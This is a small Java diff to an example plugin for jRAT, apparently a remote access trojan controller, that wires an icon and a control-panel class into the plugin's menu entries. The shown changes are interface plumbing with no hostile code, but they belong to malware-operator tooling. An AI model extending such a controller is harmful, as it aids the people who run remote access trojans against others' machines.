@@ -20,6 +20,7 @@ import pro.jrat.api.events.OnEnableEvent;
 import pro.jrat.api.events.OnPacketEvent;
 import pro.jrat.api.events.OnSendPacketEvent;
 import pro.jrat.client.ui.DialogAbout;
+import pro.jrat.client.ui.ExampleControlPanel;
 
 public class ExampleClientPlugin extends RATPlugin {
 	
@@ -109,7 +110,7 @@ public class ExampleClientPlugin extends RATPlugin {
 			public void onClick(List<RATObject> servers) {
 				
 			}
-		}, "Example Plugin", null);
+		}, "Example Plugin", icon);
 
 		List<RATMenuItem> list = new ArrayList<RATMenuItem>();
 		list.add(item);
@@ -118,7 +119,7 @@ public class ExampleClientPlugin extends RATPlugin {
 
 	@Override
 	public List<RATControlMenuEntry> getControlTreeItems() throws Exception {
-		RATControlMenuEntry item = new RATControlMenuEntry("Example Plugin", icon, null);
+		RATControlMenuEntry item = new RATControlMenuEntry("Example Plugin", icon, ExampleControlPanel.class);
 
 		List<RATControlMenuEntry> list = new ArrayList<RATControlMenuEntry>();
 		list.add(item);
